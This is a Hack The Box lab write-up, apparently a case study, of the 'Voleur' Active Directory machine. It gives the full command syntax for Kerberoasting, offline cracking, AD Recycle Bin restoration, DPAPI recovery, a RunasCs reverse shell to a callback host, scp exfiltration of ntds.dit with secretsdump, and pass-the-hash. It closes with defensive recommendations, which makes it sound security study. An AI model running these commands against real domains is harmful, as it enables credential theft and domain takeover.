---
title: "Voleur — Credential Chain to Offline Directory-Backup Abuse"
description: "Share-hosted documents, Kerberoasting, AD Recycle Bin recovery, and a WSL pivot lead into offline directory-backup analysis."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - dpapi
  - wsl
  - backup-security
objective: "Progress from provided low-privilege domain credentials to administrative access through credential recovery, Kerberos abuse, and offline backup analysis."
tools:
  - nmap
  - NetExec
  - john
  - hashcat
  - targetedKerberoast
  - Impacket
  - evil-winrm
  - RunasCs
  - ssh
skill: "Active Directory credential recovery and post-exploitation chaining"
outcome: "Administrative domain access after offline Active Directory backup extraction and pass-the-hash"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Hard |
| Target environment | Windows Active Directory domain controller with an attached WSL instance |
| Starting position | Provided low-privilege domain credentials |
| Objective | Progress from those credentials to administrative access through credential recovery, Kerberos abuse, and offline backup analysis |
| Outcome | Administrative domain access via offline `ntds.dit` and SYSTEM hive extraction |

## Provided credentials to offline directory backup

Voleur is a Hard-rated Hack The Box Windows Active Directory lab. Starting from provided low-privilege domain credentials, the chain moves through a share-hosted access-review spreadsheet, Kerberoasting, an AD Recycle Bin recovery, DPAPI-protected material, and a WSL pivot into an offline directory-backup disclosure. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Provided domain credentials → encrypted share document → Kerberoasting → WinRM foothold → LDAP service-account pivot → AD Recycle Bin recovery → DPAPI decryption → WSL SSH access → offline `ntds.dit` extraction → Administrator**

## Provided domain credentials and a co-hosted WSL pivot

- **Target:** A Windows Active Directory domain controller exposing Kerberos, LDAP, SMB, and WinRM, plus an SSH service provided by a co-hosted WSL instance on a non-default port.
- **Starting position:** Provided low-privilege domain credentials for `<INITIAL_DOMAIN_USER>`.
- **Objective:** Escalate from those credentials to administrative access and demonstrate what the recovered material exposes.
- **Constraints:** Activity stayed inside the Hack The Box lab environment. Kerberos service-ticket requests require the client and domain-controller clocks to agree, so time is synchronized against the domain controller and a Kerberos client configuration is in place before any ticket is requested.

## Evidence: share spreadsheet, Kerberoast, DPAPI, WSL backup extraction

### 1. Service Enumeration and Directory Reconnaissance

Observation: I checked the standard Active Directory surface with a full TCP scan, which exposed an SSH service on a non-default port; the provided account can read directory data and at least one operational share.

```bash
nmap -sC -sV -p- <TARGET_IP> -oA <OUTPUT_PREFIX>
```

```text
Domain services: Kerberos, LDAP, SMB, WinRM
Host: <DOMAIN_CONTROLLER>
SSH on <WSL_SSH_PORT>: WSL pivot surface
```

LDAP enumeration with the provided account returns the domain principals:

```bash
nxc ldap <DOMAIN> -u '<INITIAL_DOMAIN_USER>' -p '<INITIAL_DOMAIN_PASSWORD>' -k --users
```

```text
<INITIAL_DOMAIN_USER>
<LDAP_SERVICE_ACCOUNT>
<IIS_SERVICE_ACCOUNT>
<WINRM_SERVICE_ACCOUNT>
<BACKUP_SERVICE_ACCOUNT>
<DPAPI_RECOVERED_USER>
```

Share enumeration identifies one readable share:

```bash
nxc smb <DOMAIN_CONTROLLER> -u '<INITIAL_DOMAIN_USER>' -p '<INITIAL_DOMAIN_PASSWORD>' -k --shares
```

```text
Readable share: <IT_SHARE>
```

Significance: Kerberos, LDAP, and SMB support directory reconnaissance; the non-default SSH port is the WSL pivot surface used later; a readable operational share may hold internal documents and credentials.

Result: directory enumeration returns the domain's user and service accounts, and one operational share is readable with the provided account.

### 2. Protected Spreadsheet and Service Credentials

Observation: the readable share contains an encrypted access-review workbook.

```bash
nxc smb <DOMAIN_CONTROLLER> -u '<INITIAL_DOMAIN_USER>' -p '<INITIAL_DOMAIN_PASSWORD>' -k \
  --share '<IT_SHARE>' --get-file '<REMOTE_SPREADSHEET>' <LOCAL_SPREADSHEET>
office2john <LOCAL_SPREADSHEET> > <SPREADSHEET_HASH_FILE>
john --wordlist=<WORDLIST> <SPREADSHEET_HASH_FILE>
```

The workbook password falls to an offline wordlist attack:

```text
<SPREADSHEET_PASSWORD>
```

The decrypted workbook discloses service-account credentials:

```text
<LDAP_SERVICE_ACCOUNT> : <LDAP_SERVICE_PASSWORD>
<IIS_SERVICE_ACCOUNT>  : <IIS_SERVICE_PASSWORD>
```

Significance: an encrypted business document does not protect embedded credentials when its password is weak, and service-account credentials widen the available authentication paths.

Result: the workbook password is recovered, and distinct LDAP and IIS service-account credentials are disclosed.

### 3. Kerberoasting to WinRM Foothold

Observation: the domain includes a service account whose service principal name can be targeted through Kerberos service-ticket requests.

```bash
python3 targetedKerberoast.py -d <DOMAIN> -k --no-pass --dc-host <DOMAIN_CONTROLLER>
hashcat -m 13100 <KERBEROAST_HASH_FILE> <WORDLIST>
```

```text
<WINRM_SERVICE_ACCOUNT> : <WINRM_SERVICE_PASSWORD>
```

The recovered account authenticates over WinRM:

```bash
impacket-getTGT <DOMAIN>/<WINRM_SERVICE_ACCOUNT>:'<WINRM_SERVICE_PASSWORD>'
evil-winrm -i <DOMAIN_CONTROLLER> -r <DOMAIN>
```

Significance: Kerberoasting permits offline password recovery against service-ticket material, and a cracked account holding WinRM authorization yields an authenticated Windows foothold.

Result: the roasted service account authenticates, providing an interactive user-level session on the target.

### 4. Service-Account Pivot and AD Recycle Bin Recovery

Observation: a separately recovered LDAP service credential allows a second execution context, from which deleted directory objects are visible and restorable.

```powershell
RunasCS.exe <LDAP_SERVICE_ACCOUNT> <LDAP_SERVICE_PASSWORD> powershell.exe -r <CALLBACK_HOST>:<CALLBACK_PORT>
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Restore-ADObject -Identity <DELETED_OBJECT_GUID>
```

The restore brings back `<RESTORED_DOMAIN_USER>`, and the access-review document already held the matching password for that account.

Significance: a recycled object can retain a viable identity after deletion, and the ability to enumerate and restore deleted objects broadens the post-compromise surface.

Result: the deleted user is restored and the document-derived password is used for that account.

### 5. DPAPI Material and WSL Service Access

Observation: the restored user's profile holds DPAPI-protected material; decrypting it recovers another domain credential, and that account's profile contains an SSH private key for a WSL service account.

```text
<DPAPI_RECOVERED_USER> : <DPAPI_RECOVERED_PASSWORD>
```

That account authenticates over WinRM, then the key grants access to the WSL service:

```bash
impacket-getTGT <DOMAIN>/<DPAPI_RECOVERED_USER>:'<DPAPI_RECOVERED_PASSWORD>'
evil-winrm -i <DOMAIN_CONTROLLER> -r <DOMAIN>
ssh -i <WSL_PRIVATE_KEY> -p <WSL_SSH_PORT> <BACKUP_SERVICE_ACCOUNT>@<DOMAIN_CONTROLLER>
```

Significance: DPAPI data can expose credentials when the required user context is available, and WSL can bridge Windows-hosted files and Linux-native access paths.

Result: a further domain credential is recovered and used over WinRM, and the SSH key grants access to the WSL backup service account.

### 6. WSL Pivot and Offline Directory-Backup Analysis

Observation: under WSL the Windows `C:` drive is mounted and exposes an Active Directory backup set containing an offline directory database (`ntds.dit`) and a SYSTEM registry hive.

The backup set is exfiltrated and parsed offline with its paired registry hive:

```bash
scp -r -i <WSL_PRIVATE_KEY> -P <WSL_SSH_PORT> \
  '<BACKUP_SERVICE_ACCOUNT>@<DOMAIN_CONTROLLER>:<WSL_BACKUP_PATH>' <LOCAL_BACKUP_DIRECTORY>
impacket-secretsdump -ntds <NTDS_DATABASE_PATH> -system <SYSTEM_HIVE_PATH> local
```

```text
<ADMINISTRATOR_ACCOUNT>:<RID>:<LM_HASH_PLACEHOLDER>:<ADMINISTRATOR_NT_HASH>:::
```

The recovered hash authenticates as the built-in Administrator:

```bash
impacket-getTGT -hashes :<ADMINISTRATOR_NT_HASH> '<DOMAIN>/<ADMINISTRATOR_ACCOUNT>'
```

Significance: an accessible offline `ntds.dit` plus its paired SYSTEM hive yields the domain's credential material, so backup storage needs protections comparable to the domain controller itself.

Result: the built-in Administrator NTLM hash is recovered, and pass-the-hash yields an administrative WinRM session on the domain controller.

## Challenges and Decisions

The source records no failed attempts, dead ends, or reversed decisions; the chain uses documented directory, DPAPI, and backup functionality at every hop.

## Outcome: Administrator hash via offline ntds.dit and SYSTEM hive

The offline directory database and its paired SYSTEM hive yielded the built-in Administrator NTLM hash. The source notes record that the hash authenticated over WinRM in the Administrator context, but no session output was retained, so I could not verify that authentication against a transcript. The chain is not reproducible from this writeup, and was not reproduced here.

## Recommendations: service passwords, shared documents, recycled objects, DPAPI, and backups

The actions below remain recommendations; validation and re-testing were not performed for this case study.

1. **Human-chosen service-account passwords.** The Kerberoastable `<WINRM_SERVICE_ACCOUNT>` password fell to offline cracking of its service ticket, yielding a WinRM foothold. *Recommendation:* assign long, random, or managed-service-account passwords to any account with a service principal name, and rotate any that have been Kerberoastable. *Detection:* monitor TGS requests for legacy encryption types and for service tickets requested against interactive accounts.
2. **Credentials stored in shared documents.** An access-review workbook on a readable share held service-account passwords, and its own password was weak. *Recommendation:* keep secrets out of spreadsheets and shared documents, use a dedicated secrets manager, and restrict share permissions to named roles. *Detection:* monitor transfers of credential-bearing documents from operational shares.
3. **Restorable recycled objects.** A service-account execution context could enumerate and restore a deleted user through the AD Recycle Bin, and the restored object retained a working password. *Recommendation:* limit membership able to restore deleted objects, and clear sensitive attributes before deletion. *Detection:* audit and monitor `Restore-ADObject` use and on deletion-listing queries.
4. **DPAPI-protected credentials in user profiles.** Profile DPAPI material decrypted in the available user context disclosed another domain credential and a reusable SSH private key. *Recommendation:* treat DPAPI artifacts and profile-resident keys as sensitive, restrict profile access, and protect DPAPI master keys. *Detection:* investigate unexpected reads of user DPAPI blobs and private-key files.
5. **Offline directory backups exposed through WSL.** A WSL service account could read a mounted Windows directory containing `ntds.dit` and a SYSTEM hive, which together expose every domain credential. *Recommendation:* store offline domain-controller backups encrypted and on isolated media, and review Windows drives mounted into WSL for service accounts. *Detection:* monitor reads of directory-database and registry-hive files, and on backup files accessible outside protected storage.

## References

- [Hack The Box — Voleur](https://app.hackthebox.com/machines/Voleur) (retired machine)
- [Nmap Reference Guide](https://nmap.org/book/man.html) (service and version scanning)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (LDAP user enumeration and SMB share access)
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) (service-ticket requests for accounts with SPNs)
- [hashcat](https://hashcat.net/hashcat/) (offline Kerberos ticket cracking)
- [John the Ripper](https://www.openwall.com/john/) (Office document hash cracking)
- [RunasCS](https://github.com/antonioCoco/RunasCs) (running a process in another user's context)
- [Impacket](https://github.com/fortra/impacket) (`getTGT` and `secretsdump`)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Active Directory Recycle Bin (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) (restoration of deleted directory objects)
- [Get-ADObject (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adobject) (querying and listing deleted objects)
- [Restore-ADObject (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject) (restoring deleted directory objects)
- [Windows Data Protection (Microsoft)](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994563(v=ws.11)>) (DPAPI design and key protection)
- [OpenSSH manual pages](https://www.openssh.com/manual.html) (SSH and SCP access to the WSL service)
